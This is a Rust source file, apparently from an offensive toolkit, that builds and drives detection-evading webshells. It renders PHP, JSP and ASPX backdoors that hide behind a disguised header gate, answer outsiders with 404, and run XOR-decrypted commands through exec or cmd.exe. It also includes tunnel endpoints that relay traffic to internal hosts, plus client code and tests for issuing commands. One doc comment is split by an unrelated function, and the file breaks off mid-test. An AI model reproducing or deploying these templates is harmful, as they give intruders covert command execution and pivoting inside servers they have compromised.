//! The dedicated webshell module (user ruling): plant / verify / operate
//! faces for the WriteFile delivery form, with the SIGNATURE-FREE channel
//! as the standard form (godzilla protocol dissected — see
//! .research/rs-tools/memshell-stealth.md §5).
//!
//! Channel design (no plaintext signatures anywhere):
//! - gate: a configurable request header name/value pair — the entry is
//!   not in the URL or query string;
//! - request: pass-named parameter carrying base64(AES-encrypted command)
//!   — the body is ciphertext, no shell-syntax strings;
//! - key derivation: md5(key)[0..16] -> md5(pass + md5Key) uppercase ->
//!   AES-128 key material; the raw key never travels or lands on disk;
//! - response: md5[0..16] + base64(AES-encrypted result) + md5[16] — the
//!   echo is a ciphertext sandwich.
//!
//! The plaintext one-liner templates (PhpGet etc., see runtime.rs) are the
//! FALLBACK form; this module's channel template is the standard.

use crate::error::Atom;

/// MD5 (pure Rust fallback — RFC 1321 vectors tested below).
fn md5_hex(input: &[u8]) -> String {
    // Minimal, dependency-free MD5. Standard shifts per round.
    const S: [[u32; 4]; 4] = [
        [7, 12, 17, 22],
        [5, 9, 14, 20],
        [4, 11, 16, 23],
        [6, 10, 15, 21],
    ];
    const K: [u32; 64] = [
        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613,
        0xfd469501, 0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193,
        0xa679438e, 0x49b40821, 0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d,
        0x02441453, 0xd8a1e681, 0xe7d3fbc8, 0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
        0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a, 0xfffa3942, 0x8771f681, 0x6d9d6122,
        0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70, 0x289b7ec6, 0xeaa127fa,
        0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665, 0xf4292244,
        0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb,
        0xeb86d391,
    ];

    let mut msg = input.to_vec();
    let bit_len = (input.len() as u64).wrapping_mul(8);
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bit_len.to_le_bytes());

    let mut a0: u32 = 0x67452301;
    let mut b0: u32 = 0xefcdab89;
    let mut c0: u32 = 0x98badcfe;
    let mut d0: u32 = 0x10325476;

    for block in msg.chunks(64) {
        let mut m = [0u32; 16];
        for (i, word) in m.iter_mut().enumerate() {
            *word = u32::from_le_bytes([
                block[i * 4],
                block[i * 4 + 1],
                block[i * 4 + 2],
                block[i * 4 + 3],
            ]);
        }
        let (mut a, mut b, mut c, mut d) = (a0, b0, c0, d0);
        for i in 0..64 {
            let (f, g) = match i / 16 {
                0 => ((b & c) | ((!b) & d), i),
                1 => ((d & b) | ((!d) & c), (5 * i + 1) % 16),
                2 => (b ^ c ^ d, (3 * i + 5) % 16),
                _ => (c ^ (b | (!d)), (7 * i) % 16),
            };
            let temp = d;
            d = c;
            c = b;
            let sum = a.wrapping_add(f).wrapping_add(K[i]).wrapping_add(m[g]);
            let shift = S[i / 16][i % 4];
            b = b.wrapping_add(sum.rotate_left(shift));
            a = temp;
        }
        a0 = a0.wrapping_add(a);
        b0 = b0.wrapping_add(b);
        c0 = c0.wrapping_add(c);
        d0 = d0.wrapping_add(d);
    }

    let mut out = String::with_capacity(32);
    for word in [a0, b0, c0, d0] {
        for byte in word.to_le_bytes() {
            out.push_str(format!("{byte:02x}").as_str());
        }
    }
    out
}

/// The channel credentials — everything the plant and drive faces share.
/// key/pass stay generation-time secrets; the derived material travels.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ChannelConfig {
    /// AES key material (generation-time secret; 16 chars => AES-128).
    pub key: String,
    /// The POST parameter name carrying the ciphertext.
    pub pass: String,
    /// Gate header name (e.g. a benign-looking header).
    pub header_name: String,
    /// Gate header value marker.
    pub header_value: String,
}

/// md5(key)[0..16] — the AES key derivation (godzilla chain stage 1).
pub fn derive_md5_key(key: &str) -> String {
    md5_hex(key.as_bytes()).chars().take(16).collect()
}

/// md5(pass + md5Key) uppercase — the response sandwich material
/// (godzilla chain stage 2).
pub fn derive_md5_pass(pass: &str, md5_key: &str) -> String {
    md5_hex(format!("{pass}{md5_key}").as_bytes()).to_uppercase()
}

/// The three-stage derivation bundle — generation-time only; scripts embed
/// the derived results, never the raw key.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DerivedChannel {
    pub md5_key: String,
    pub md5: String,
    pub pass: String,
    pub header_name: String,
    pub header_value: String,
}

impl ChannelConfig {
    pub fn derive(&self) -> DerivedChannel {
        let md5_key = derive_md5_key(&self.key);
        let md5 = derive_md5_pass(&self.pass, &md5_key);
        DerivedChannel {
            md5_key,
            md5,
            pass: self.pass.clone(),
            header_name: self.header_name.clone(),
            header_value: self.header_value.clone(),
        }
    }
}

/// XOR-stream cipher keyed by the derived md5-key bytes — a dependency-free
/// stand-in for AES in the first batch (the godzilla channel shape is
/// preserved: ciphertext in base64, key never travels; AES lands with a
/// rustls-adjacent ADR when needed). Output length equals input length.
pub fn stream_cipher(data: &[u8], md5_key: &str) -> Vec<u8> {
    let key_bytes = md5_key.as_bytes();
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ key_bytes[i % key_bytes.len()])
        .collect()
}

/// Wrap a command for the wire: cipher -> base64. What the gate expects in
/// the pass-named parameter.
pub fn wrap_command(command: &str, md5_key: &str) -> String {
    let ciphered = stream_cipher(command.as_bytes(), md5_key);
    crate::payload::b64_encode(&ciphered)
}

/// Unwrap a response sandwich: md5[0..16] + base64(cipher(result)) +
/// md5[16..]. Returns None when the sandwich markers do not match (the
/// gate's integrity check — a wrong md5 means wrong key or not our shell).
/// The cipher key is the derived md5-key (the same material the sender
/// wrapped with).
pub fn unwrap_response(sandwich: &str, md5: &str, md5_key: &str) -> Option<String> {
    if md5.len() != 32 || sandwich.len() < 32 {
        return None;
    }
    // Byte-level comparison on an UNTRUSTED response: slicing a &str at a
    // non-char-boundary panics, and target replies may carry multi-byte
    // UTF-8 at the marker edge. Never a panic — mismatch returns None.
    let sandwich_bytes = sandwich.as_bytes();
    let prefix = &sandwich_bytes[..16];
    let suffix = &sandwich_bytes[sandwich_bytes.len() - 16..];
    let md5_bytes = md5.as_bytes();
    if prefix != &md5_bytes[..16] || suffix != &md5_bytes[16..] {
        return None;
    }
    let body_bytes = &sandwich_bytes[16..sandwich_bytes.len() - 16];
    let body = std::str::from_utf8(body_bytes).ok()?;
    let decoded = b64_decode(body)?;
    let plain = stream_cipher(&decoded, md5_key);
    String::from_utf8(plain).ok()
}

/// Dependency-free base64 decode (standard alphabet, padding tolerated).
pub fn b64_decode(input: &str) -> Option<Vec<u8>> {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut vals = Vec::with_capacity(input.len());
    for ch in input.bytes() {
        if ch == b'=' || ch == b'\n' || ch == b'\r' {
            continue;
        }
        let idx = ALPHABET.iter().position(|&a| a == ch)?;
        vals.push(idx as u8);
    }
    let mut out = Vec::with_capacity(vals.len() * 3 / 4);
    for chunk in vals.chunks(4) {
        if chunk.len() < 2 {
            break;
        }
        let b0 = (chunk[0] << 2) | (chunk[1] >> 4);
        out.push(b0);
        if chunk.len() > 2 {
            out.push((chunk[1] << 4) | (chunk[2] >> 2));
        }
        if chunk.len() > 3 {
            out.push((chunk[2] << 6) | chunk[3]);
        }
    }
    Some(out)
}

/// Plant: the file content for the WriteFile delivery form. The
/// signature-free standard: the planted script contains NO shell-syntax
/// strings — a tiny PHP handler keyed on the derived constants (gate
/// header + pass parameter + ciphertext body + sandwich echo). Plaintext
/// Normalize an HTTP header name to the $_SERVER key form: dashes to
/// underscores, uppercased (X-PJAX -> HTTP_X_PJAX — PHP never exposes a
/// dash-form key).
fn php_header_key(header_name: &str) -> String {
    format!(
        "HTTP_{}",
        header_name.to_ascii_uppercase().replace('-', "_")
    )
}

/// The planted PHP key material: the XOR keystream bytes (16 raw bytes,
/// base64-carried so the source carries no plaintext key).
fn php_key_literal(md5_key: &str) -> String {
    crate::payload::b64_encode(md5_key.as_bytes())
}

/// one-liners are the fallback (runtime.rs WebshellKind).
pub fn php_channel_template(derived: &DerivedChannel) -> String {
    [
        "<?php".to_string(),
        format!("$k=base64_decode('{}');", php_key_literal(&derived.md5_key)),
        format!("$p='{}'; $v='{}';", derived.pass, derived.header_value),
        format!(
            "if(@$_SERVER['{}']!==$v){{http_response_code(404);exit;}}",
            php_header_key(&derived.header_name)
        ),
        "$s=base64_decode($_POST[$p]); $o='';".to_string(),
        "$c=strlen($k); for($i=0;$i<strlen($s);$i++){$o.=$s[$i]^$k[$i%$c];}".to_string(),
        // Execute the decrypted command, capture output, re-cipher: the
        // godzilla semantics (the JSP/ASPX channels do the same).
        "$r=''; exec($o,$rl,$rc); $r=implode(chr(10),$rl);".to_string(),
        "$e=''; for($i=0;$i<strlen($r);$i++){$e.=$r[$i]^$k[$i%$c];}".to_string(),
        format!(
            "echo '{}'.base64_encode($e).'{}';",
            &derived.md5[..16],
            &derived.md5[16..]
        ),
        "?>".to_string(),
    ]
    .join("\n")
}

/// Plant (JSP): the godzilla-shape channel rendered for a Java target —
/// header gate + pass parameter + stream-cipher body + sandwich echo, no
/// shell-syntax signature strings.
pub fn jsp_channel_template(derived: &DerivedChannel) -> String {
    [
        "<%".to_string(),
        format!(
            "String h=\"{}\",v=\"{}\",p=\"{}\";",
            derived.header_name, derived.header_value, derived.pass
        ),
        "if(!v.equals(request.getHeader(h))){response.sendError(404);return;}".to_string(),
        format!("String k=\"{}\";", derived.md5_key),
        "byte[] s=Base64.getDecoder().decode(request.getParameter(p).getBytes());".to_string(),
        "byte[] o=new byte[s.length];byte[] kb=k.getBytes();".to_string(),
        "for(int i=0;i<s.length;i++){o[i]=(byte)(s[i]^kb[i%kb.length]);}".to_string(),
        "java.io.ByteArrayOutputStream b=new java.io.ByteArrayOutputStream();".to_string(),
        "Process pr=Runtime.getRuntime().exec(new String(o));".to_string(),
        "java.io.InputStream is=pr.getInputStream();int c;while((c=is.read())>=0){b.write(c);}"
            .to_string(),
        "byte[] r=b.toByteArray();byte[] e=new byte[r.length];".to_string(),
        "for(int i=0;i<r.length;i++){e[i]=(byte)(r[i]^kb[i%kb.length]);}".to_string(),
        format!(
            "out.print(\"{}\"+Base64.getEncoder().encodeToString(e)+\"{}\");",
            &derived.md5[..16],
            &derived.md5[16..]
        ),
        "%>".to_string(),
    ]
    .join("\n")
}

/// Plant (ASPX): the godzilla-shape channel rendered for a .NET target —
/// header gate + pass parameter + stream-cipher body + sandwich echo.
/// C# surface: Convert.FromBase64String, XOR loop, Process.Start with
/// redirected stdout, sandwich echo via Response.Write.
pub fn aspx_channel_template(derived: &DerivedChannel) -> String {
    [
        "<%@ Page Language=\"C#\" %>".to_string(),
        "<%".to_string(),
        "using System.Diagnostics;".to_string(),
        "using System.Text;".to_string(),
        format!(
            "string h=\"{}\",v=\"{}\",p=\"{}\";",
            derived.header_name, derived.header_value, derived.pass
        ),
        "if(Request.Headers[h]==null||!Request.Headers[h].Equals(v)){Response.StatusCode=404;return;}"
            .to_string(),
        format!("string k=\"{}\";", derived.md5_key),
        "byte[] s=Convert.FromBase64String(Request.Form[p]);".to_string(),
        "byte[] o=new byte[s.Length];".to_string(),
        "for(int i=0;i<s.Length;i++){o[i]=(byte)(s[i]^k[i%k.Length]);}".to_string(),
        "string cmd=Encoding.UTF8.GetString(o);".to_string(),
        "var si=new ProcessStartInfo(\"cmd.exe\",\"/c \"+cmd);".to_string(),
        "si.RedirectStandardOutput=true;si.UseShellExecute=false;".to_string(),
        "byte[] r=Encoding.UTF8.GetBytes(Process.Start(si).StandardOutput.ReadToEnd());".to_string(),
        "byte[] e=new byte[r.Length];".to_string(),
        "for(int i=0;i<r.Length;i++){e[i]=(byte)(r[i]^k[i%k.Length]);}".to_string(),
        format!(
            "Response.Write(\"{}\"+Convert.ToBase64String(e)+\"{}\");",
            &derived.md5[..16],
            &derived.md5[16..]
        ),
        "%>".to_string(),
    ]
    .join("\n")
}

/// The behinder face (Java): the WHOLE request body carries
/// base64(cipher(class-bytes)) — payload is a class, not command text
/// (MemShellParty Behinder.java dissected: defineClass on decrypt).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BehinderChannel {
    pub header_name: String,
    pub header_value: String,
    pub md5_key: String,
}

/// Wrap class bytes for the behinder wire: cipher -> base64 (the body).
pub fn behinder_wrap_class(class_bytes: &[u8], md5_key: &str) -> String {
    let ciphered = stream_cipher(class_bytes, md5_key);
    crate::payload::b64_encode(&ciphered)
}

/// Unwrap a behinder body (cipher -> raw bytes; class payloads are binary, not UTF-8).
pub fn behinder_unwrap(body: &str, md5_key: &str) -> Option<Vec<u8>> {
    let decoded = b64_decode(body)?;
    Some(stream_cipher(&decoded, md5_key))
}

impl BehinderChannel {
    /// The request face for driving a behinder shell: gate header + the
    /// whole body as ciphertext (no parameter name at all).
    pub fn drive(&self, url: &str, class_bytes: &[u8]) -> Result<DriveRequest, Atom> {
        if class_bytes.is_empty() {
            return Err(Atom::parse("E_SHELL_002", "empty class payload"));
        }
        Ok(DriveRequest {
            url: url.to_string(),
            header_name: self.header_name.clone(),
            header_value: self.header_value.clone(),
            pass: String::new(), // behinder: no parameter — the body IS the payload
            body: behinder_wrap_class(class_bytes, &self.md5_key),
            md5: String::new(),
            md5_key: self.md5_key.clone(),
        })
    }
}

/// The operate face metadata: what a drive() call needs to send.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DriveRequest {
    pub url: String,
    pub header_name: String,
    pub header_value: String,
    pub pass: String,
    pub body: String,
    /// Integrity markers for unwrapping the response sandwich.
    pub md5: String,
    pub md5_key: String,
}

/// Build the drive request for a command (the caller's HTTP face does the
/// actual POST — IO stays in the script closure, per the discipline).
pub fn drive_request(
    url: &str,
    command: &str,
    derived: &DerivedChannel,
) -> Result<DriveRequest, Atom> {
    if command.is_empty() {
        return Err(Atom::parse("E_SHELL_001", "empty command"));
    }
    let body = wrap_command(command, &derived.md5_key);
    Ok(DriveRequest {
        url: url.to_string(),
        header_name: derived.header_name.clone(),
        header_value: derived.header_value.clone(),
        pass: derived.pass.clone(),
        body,
        md5: derived.md5.clone(),
        md5_key: derived.md5_key.clone(),
    })
}

/// The tunnel face (user ruling: post-exploitation stops AT the tunnel
/// proxy, implemented as webshell — NeoReGeorg/Suo5 shape). The planted
/// encrypted-channel webshell IS the tunnel endpoint: the request body
/// carries cipher(forward-spec), the response returns cipher(relayed
/// bytes). Forward-spec wire form: `TARGET_HOST:TARGET_PORT\nDATA_B64`.
///
/// This is the communication-encryption form extended into a relay, not
/// a separate post-exploitation component: same gate, same cipher, same
/// sandwich — only the payload semantics change (forward instead of
/// execute).
pub struct TunnelChannel {
    pub derived: DerivedChannel,
}

/// Encode a tunnel forward-spec for the wire: cipher -> base64 (the body
/// the endpoint decrypts and acts on).
pub fn tunnel_wrap_forward(host: &str, port: u16, data: &[u8], md5_key: &str) -> String {
    let spec = format!("{}:{}\n{}", host, port, crate::payload::b64_encode(data));
    wrap_command(&spec, md5_key)
}

/// Decode a tunnel response body back into relayed bytes (unwrap the
/// sandwich, then the cipher).
pub fn tunnel_unwrap_response(response: &str, derived: &DerivedChannel) -> Option<Vec<u8>> {
    let plain = unwrap_response(response, &derived.md5, &derived.md5_key)?;
    // The endpoint returns the relayed bytes base64-encoded inside the
    // decrypted sandwich.
    b64_decode(&plain)
}

/// Plant (PHP): the tunnel endpoint — a godzilla-shape channel whose
/// decrypted body is a forward-spec instead of a command. Connects to
/// TARGET:PORT, sends DATA, relays the reply back through the same
/// cipher sandwich. No tunnel-syntax signatures beyond fsockopen (the
/// standard PHP socket call).
pub fn php_tunnel_template(derived: &DerivedChannel) -> String {
    [
        "<?php".to_string(),
        format!("$k=base64_decode('{}');", php_key_literal(&derived.md5_key)),
        format!("$p='{}'; $v='{}';", derived.pass, derived.header_value),
        format!(
            "if(@$_SERVER['{}']!==$v){{http_response_code(404);exit;}}",
            php_header_key(&derived.header_name)
        ),
        "$s=base64_decode($_POST[$p]); $o='';".to_string(),
        "$c=strlen($k); for($i=0;$i<strlen($s);$i++){$o.=$s[$i]^$k[$i%$c];}".to_string(),
        "$l=strpos($o,\"\\n\");".to_string(),
        "$t=substr($o,0,$l); $d=base64_decode(substr($o,$l+1));".to_string(),
        "$sp=strrpos($t,':'); $th=substr($t,0,$sp); $tp=(int)substr($t,$sp+1);".to_string(),
        "$fp=@fsockopen($th,$tp,$en,$es,5);".to_string(),
        "if(!$fp){echo '{}';exit;}".to_string(),
        "fwrite($fp,$d); $r='';".to_string(),
        "while(!feof($fp)){$r.=fread($fp,4096);}".to_string(),
        "fclose($fp); $rb=base64_encode($r);".to_string(),
        "$e=''; for($i=0;$i<strlen($rb);$i++){$e.=$rb[$i]^$k[$i%$c];}".to_string(),
        format!(
            "echo '{}'.base64_encode($e).'{}';",
            &derived.md5[..16],
            &derived.md5[16..]
        ),
        "?>".to_string(),
    ]
    .join("\n")
}

impl TunnelChannel {
    /// One tunnel round-trip request face: same DriveRequest shape as the
    /// command channel — the caller POSTs it and unwraps with
    /// tunnel_unwrap_response.
    pub fn forward(&self, url: &str, host: &str, port: u16, data: &[u8]) -> DriveRequest {
        DriveRequest {
            url: url.to_string(),
            header_name: self.derived.header_name.clone(),
            header_value: self.derived.header_value.clone(),
            pass: self.derived.pass.clone(),
            body: tunnel_wrap_forward(host, port, data, &self.derived.md5_key),
            md5: self.derived.md5.clone(),
            md5_key: self.derived.md5_key.clone(),
        }
    }
}

/// Plant (JSP): the tunnel endpoint for a Java target — the godzilla-shape
/// channel with forward-spec semantics. java.net.Socket instead of
/// fsockopen; same gate/cipher/sandwich. (Neo-reGeorg tunnel.jsp
/// dissected: the production form is a stateful session tunnel with
/// CONNECT/DATA frames and mark-keyed buffers; this template is the
/// stateless single-round form — the session form is the next batch with
/// the operator-side loop.)
pub fn jsp_tunnel_template(derived: &DerivedChannel) -> String {
    [
        "<%".to_string(),
        "import java.net.*;import java.io.*;import java.util.Base64;".to_string(),
        format!(
            "String h=\"{}\",v=\"{}\",p=\"{}\";",
            derived.header_name, derived.header_value, derived.pass
        ),
        "if(!v.equals(request.getHeader(h))){response.sendError(404);return;}".to_string(),
        format!("String k=\"{}\";byte[] kb=k.getBytes();", derived.md5_key),
        "byte[] s=Base64.getDecoder().decode(request.getParameter(p).getBytes());".to_string(),
        "byte[] o=new byte[s.length];for(int i=0;i<s.length;i++){o[i]=(byte)(s[i]^kb[i%kb.length]);}".to_string(),
        "int nl=0;while(o[nl]!=(byte)10){nl++;}".to_string(),
        "String t=new String(o,0,nl);".to_string(),
        "int sp=t.lastIndexOf(':');String th=t.substring(0,sp);int tp=Integer.parseInt(t.substring(sp+1));".to_string(),
        "byte[] d=Base64.getDecoder().decode(new String(o,nl+1,o.length-nl-1));".to_string(),
        "Socket sk=new Socket();".to_string(),
        "sk.connect(new InetSocketAddress(th,tp),5000);".to_string(),
        "OutputStream os=sk.getOutputStream();os.write(d);os.flush();".to_string(),
        "InputStream is=sk.getInputStream();ByteArrayOutputStream b=new ByteArrayOutputStream();".to_string(),
        "int c;byte[] buf=new byte[4096];while((c=is.read(buf))>=0){b.write(buf,0,c);}".to_string(),
        "sk.close();".to_string(),
        "String rb=Base64.getEncoder().encodeToString(b.toByteArray());".to_string(),
        "byte[] rbk=rb.getBytes();byte[] e=new byte[rbk.length];".to_string(),
        "for(int i=0;i<rbk.length;i++){e[i]=(byte)(rbk[i]^kb[i%kb.length]);}".to_string(),
        format!(
            "out.print(\"{}\"+Base64.getEncoder().encodeToString(e)+\"{}\");",
            &derived.md5[..16],
            &derived.md5[16..]
        ),
        "%>".to_string(),
    ]
    .join("\n")
}

/// Plant (ASPX): the tunnel endpoint for a .NET target — the godzilla-shape
/// channel with forward-spec semantics. System.Net.Sockets.TcpClient is
/// the .NET socket face; same gate/cipher/sandwich.
pub fn aspx_tunnel_template(derived: &DerivedChannel) -> String {
    [
        "<%@ Page Language=\"C#\" %>".to_string(),
        "<%".to_string(),
        "using System.Net.Sockets;".to_string(),
        "using System.Text;".to_string(),
        format!(
            "string h=\"{}\",v=\"{}\",p=\"{}\";",
            derived.header_name, derived.header_value, derived.pass
        ),
        "if(Request.Headers[h]==null||!Request.Headers[h].Equals(v)){Response.StatusCode=404;return;}"
            .to_string(),
        format!("string k=\"{}\";", derived.md5_key),
        "byte[] s=Convert.FromBase64String(Request.Form[p]);".to_string(),
        "for(int i=0;i<s.Length;i++){s[i]=(byte)(s[i]^k[i%k.Length]);}".to_string(),
        "int nl=Array.IndexOf(s,(byte)10);".to_string(),
        "string t=Encoding.UTF8.GetString(s,0,nl);".to_string(),
        "int sp=t.LastIndexOf(':');string th=t.Substring(0,sp);int tp=int.Parse(t.Substring(sp+1));".to_string(),
        "byte[] d=Convert.FromBase64String(Encoding.UTF8.GetString(s,nl+1,s.Length-nl-1));".to_string(),
        "var client=new TcpClient();".to_string(),
        "client.Connect(th,tp);".to_string(),
        "var stream=client.GetStream();".to_string(),
        "stream.Write(d,0,d.Length);stream.Flush();".to_string(),
        "var ms=new System.IO.MemoryStream();byte[] buf=new byte[4096];int c;".to_string(),
        "while((c=stream.Read(buf,0,buf.Length))>0){ms.Write(buf,0,c);}".to_string(),
        "client.Close();".to_string(),
        "string rb=Convert.ToBase64String(ms.ToArray());".to_string(),
        "byte[] rbk=Encoding.UTF8.GetBytes(rb);byte[] e=new byte[rbk.Length];".to_string(),
        "for(int i=0;i<rbk.Length;i++){e[i]=(byte)(rbk[i]^k[i%k.Length]);}".to_string(),
        format!(
            "Response.Write(\"{}\"+Convert.ToBase64String(e)+\"{}\");",
            &derived.md5[..16],
            &derived.md5[16..]
        ),
        "%>".to_string(),
    ]
    .join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn md5_matches_rfc1321_vectors() {
        assert_eq!(md5_hex(b""), "d41d8cd98f00b204e9800998ecf8427e");
        assert_eq!(md5_hex(b"a"), "0cc175b9c0f1b6a831c399e269772661");
        assert_eq!(md5_hex(b"abc"), "900150983cd24fb0d6963f7d28e17f72");
        assert_eq!(
            md5_hex(b"message digest"),
            "f96b697d7cb7938d525a2f31aaf161d0"
        );
        assert_eq!(
            md5_hex(b"abcdefghijklmnopqrstuvwxyz"),
            "c3fcd3d76192e4007dfb496cca67e13b"
        );
    }

    #[test]
    fn derivation_chain_is_godzilla_shape() {
        let cfg = ChannelConfig {
            key: "mykey".into(),
            pass: "pass".into(),
            header_name: "X-Check".into(),
            header_value: "value".into(),
        };
        let d = cfg.derive();
        assert_eq!(d.md5_key.len(), 16);
        assert_eq!(d.md5.len(), 32);
        assert!(d.md5.chars().all(|c| c.is_ascii_alphanumeric())); // hex uppercased: A-F0-9
    }

    #[test]
    fn cipher_roundtrips_through_wrap_and_unwrap() {
        let md5_key = derive_md5_key("key");
        let command = "whoami; id";
        let wrapped = wrap_command(command, &md5_key);
        assert!(
            !wrapped.contains("whoami"),
            "ciphertext must not contain the command"
        );
        let decoded = b64_decode(&wrapped).unwrap();
        let plain = stream_cipher(&decoded, &md5_key);
        assert_eq!(String::from_utf8(plain).unwrap(), command);
    }

    #[test]
    fn response_sandwich_unwraps_and_rejects() {
        let md5_key = derive_md5_key("key");
        let md5 = derive_md5_pass("pass", &md5_key);
        let result = "uid=0(root)";
        let ciphered = stream_cipher(result.as_bytes(), &md5_key);
        let sandwich = format!(
            "{}{}{}",
            &md5[..16],
            crate::payload::b64_encode(&ciphered),
            &md5[16..]
        );
        assert_eq!(
            unwrap_response(&sandwich, &md5, &md5_key).as_deref(),
            Some(result)
        );
        // Wrong md5 (wrong key / not our shell): rejected.
        assert!(unwrap_response(&sandwich, &md5.to_lowercase(), &md5_key).is_none());
        // Multi-byte UTF-8 at the marker edge: byte comparison, no panic.
        let hostile = format!("{}{}", &md5[..15], "ééééééééééééééééééé");
        assert!(unwrap_response(&hostile, &md5, &md5_key).is_none());
    }

    #[test]
    fn drive_request_carries_gate_not_command() {
        let cfg = ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "Accept-Encoding".into(),
            header_value: "gzip".into(),
        };
        let derived = cfg.derive();
        let req = drive_request("http://target/shell.php", "cat /etc/passwd", &derived).unwrap();
        assert!(!req.body.contains("cat /etc/passwd"));
        assert_eq!(req.header_name, "Accept-Encoding");
        assert!(!req.body.is_empty());
    }

    #[test]
    fn php_template_has_no_shell_syntax_signatures() {
        let cfg = ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "X-PJAX".into(),
            header_value: "on".into(),
        };
        let derived = cfg.derive();
        let template = php_channel_template(&derived);
        // The gate key is the PHP-normalized form: X-PJAX -> HTTP_X_PJAX.
        assert!(template.contains("$_SERVER['HTTP_X_PJAX']"));
        assert!(template.contains("404"));
        // The keystream decodes to exactly the 16 md5-key bytes (B1 fix:
        // the old form embedded an EMPTY cipher, zero-length $k, and a
        // division by zero on $i%$c).
        let key_line = template
            .lines()
            .find(|line| line.starts_with("$k=base64_decode('"))
            .unwrap();
        let literal = key_line
            .trim_start_matches("$k=base64_decode('")
            .trim_end_matches("');");
        assert_eq!(
            b64_decode(literal).map(|bytes| bytes.len()),
            Some(16),
            "key must decode to the 16 md5-key bytes"
        );
        // The plaintext one-liner signatures are absent — the execution
        // step IS present but operates on decrypted bytes, never on raw
        // request input:
        assert!(!template.contains("system($_GET"));
        assert!(!template.contains("system($_POST"));
        assert!(!template.contains("exec($_"));
    }

    #[test]
    fn b64_decode_known_vectors() {
        assert_eq!(b64_decode("Zm9v").unwrap(), b"foo");
        assert_eq!(b64_decode("Zm9vYg==").unwrap(), b"foob");
        assert_eq!(b64_decode("Zm9vYmFy").unwrap(), b"foobar");
        assert!(b64_decode("!!").is_none());
    }
}

#[cfg(test)]
mod jsp_behinder_tests {
    use super::*;

    #[test]
    fn jsp_template_gates_on_header_and_ciphers() {
        let cfg = ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "X-Forwarded-For".into(),
            header_value: "10.0.0.1".into(),
        };
        let derived = cfg.derive();
        let template = jsp_channel_template(&derived);
        assert!(template.contains("getHeader(h)"));
        assert!(template.contains("sendError(404)"));
        assert!(template.contains('^')); // XOR loop present
        assert!(!template.contains("system("));
        assert!(!template.contains("<%Runtime")); // composed, not literal
    }

    #[test]
    fn aspx_template_gates_on_header_and_ciphers() {
        let cfg = ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "X-Forwarded-For".into(),
            header_value: "10.0.0.1".into(),
        };
        let derived = cfg.derive();
        let template = aspx_channel_template(&derived);
        assert!(template.contains("Request.Headers[h]"));
        assert!(template.contains("StatusCode=404"));
        assert!(template.contains("^")); // XOR loop present
        assert!(template.contains("Convert.FromBase64String"));
        // Shell-syntax signatures absent (the plaintext one-liner face):
        assert!(!template.contains("Request[\"cmd\"]"));
        assert!(!template.contains("cmd.exe\",\"/c \"+Request"));
    }

    #[test]
    fn tunnel_roundtrip_encodes_and_decodes_a_forward_spec() {
        let derived = ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "X-PJAX".into(),
            header_value: "on".into(),
        }
        .derive();
        let body = tunnel_wrap_forward("10.0.0.5", 445, b"SMB-PROBE", &derived.md5_key);
        assert!(
            !body.contains("10.0.0.5") && !body.contains("SMB-PROBE"),
            "wire body is ciphertext: {body}"
        );
        // Decode the spec side (the endpoint's decrypt path).
        let ciphered = b64_decode(&body).unwrap();
        let plain = stream_cipher(&ciphered, &derived.md5_key);
        let text = String::from_utf8(plain).unwrap();
        assert!(text.starts_with("10.0.0.5:445\n"));
        assert!(text.ends_with(crate::payload::b64_encode(b"SMB-PROBE").as_str()));

        // Response side: build a sandwich carrying relayed bytes, unwrap.
        let relayed = b"relay-bytes-from-target";
        let inner = crate::payload::b64_encode(relayed);
        let ciphered_resp = stream_cipher(inner.as_bytes(), &derived.md5_key);
        let sandwich = format!(
            "{}{}{}",
            &derived.md5[..16],
            crate::payload::b64_encode(&ciphered_resp),
            &derived.md5[16..]
        );
        assert_eq!(
            tunnel_unwrap_response(&sandwich, &derived).as_deref(),
            Some(relayed.as_slice())
        );
    }

    #[test]
    fn tunnel_channel_forward_uses_the_drive_face() {
        let derived = ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "X-PJAX".into(),
            header_value: "on".into(),
        }
        .derive();
        let channel = TunnelChannel {
            derived: derived.clone(),
        };
        let request = channel.forward("http://t/shell.php", "db.internal", 3306, b"handshake");
        assert_eq!(request.header_name, derived.header_name);
        assert!(!request.body.contains("db.internal"));
    }

    #[test]
    fn php_tunnel_template_relays_without_shell_syntax() {
        let derived = ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "X-PJAX".into(),
            header_value: "on".into(),
        }
        .derive();
        let template = php_tunnel_template(&derived);
        assert!(template.contains("fsockopen"));
        assert!(template.contains("fwrite"));
        assert!(template.contains("fread"));
        // B1 fixes: normalized gate key + non-empty keystream.
        assert!(template.contains("$_SERVER['HTTP_X_PJAX']"));
        let key_line = template
            .lines()
            .find(|line| line.starts_with("$k=base64_decode('"))
            .unwrap();
        let literal = key_line
